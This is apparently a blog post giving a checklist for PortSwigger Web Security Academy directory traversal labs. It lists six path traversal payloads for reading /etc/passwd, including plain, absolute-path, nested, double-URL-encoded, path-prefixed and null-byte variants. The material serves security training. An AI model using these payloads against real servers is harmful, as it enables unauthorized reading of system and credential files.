---
layout: post
title:  "PortSwigger - Directory Traversal - Mystery Labs Checklist"
date:   2024-06-10 00:00
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [directory-traversal,checklist]
categories: [PortSwigger]
---

## 1. Use basic directory traversal:
```
../../../../etc/passwd
```

## 2. Use absolute path:
```
/etc/passwd
```

## 3. Use recursion: 
```
..././..././..././..././etc/passwd
```

## 4. Use double url encoding
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 
```

## 5. Use start of path:
```
/var/www/images/../../../../etc/passwd
```

## 6. Use null byte:
```
../../../etc/passwd%00123.png
```
<hr/>